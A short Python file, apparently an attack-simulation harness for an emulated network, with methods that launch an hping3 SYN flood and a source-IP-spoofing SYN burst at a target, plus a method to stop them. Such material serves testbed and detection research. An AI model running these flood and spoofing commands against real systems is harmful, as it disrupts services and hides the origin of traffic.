# Attack Simulation

class SimulateAttacks:

    def __init__(self):
        self.attack_processes = []


    #  DDoS attack increasing throughput 

    def launch_ddos(self, attacker, target_ip: str, port: int = 8000, duration: int = 30):

        print(f"\n[ATTACK] DDoS starting → {attacker.name} → {target_ip}:{port}")
        
        #--interval of u1000 = 1 packet per millisecond
        cmd = (
            f"timeout {duration} hping3 -S -p {port} "
            f"--interval u1000 "        
            f"{target_ip} >/dev/null 2>&1"
        )

        p = attacker.popen(['bash', '-c', cmd])
        self.attack_processes.append(p)
        print(f"  [+] {attacker.name} ({attacker.IP()}) → {target_ip} ")

    # IP Spoofing creating a fake ip of 172.16.0.1

    def launch_spoof(self, attacker, target_ip: str, port: int = 8000,count=10):
        fake_ip = "172.16.0.1"

        print(f"\n[ATTACK] Spoofing → {target_ip}:{port}")

        cmd = (
            f"hping3 -S -p {port} "
            f"-a {fake_ip} "        # forge source IP
            f"-c {count} --faster " 
            f"{target_ip} >/dev/null 2>&1"
        )
        p = attacker.popen(['bash', '-c', cmd])
        self.attack_processes.append(p)
        print(f"  [+] Sending {count} packets with src={fake_ip}")

    def stopAll(self):
        print("\n[ATTACK] Stopping all attack processes...")
        for p in self.attack_processes:
            if p:
                try:
                    p.terminate()
                except Exception:
                    pass
        self.attack_processes.clear()



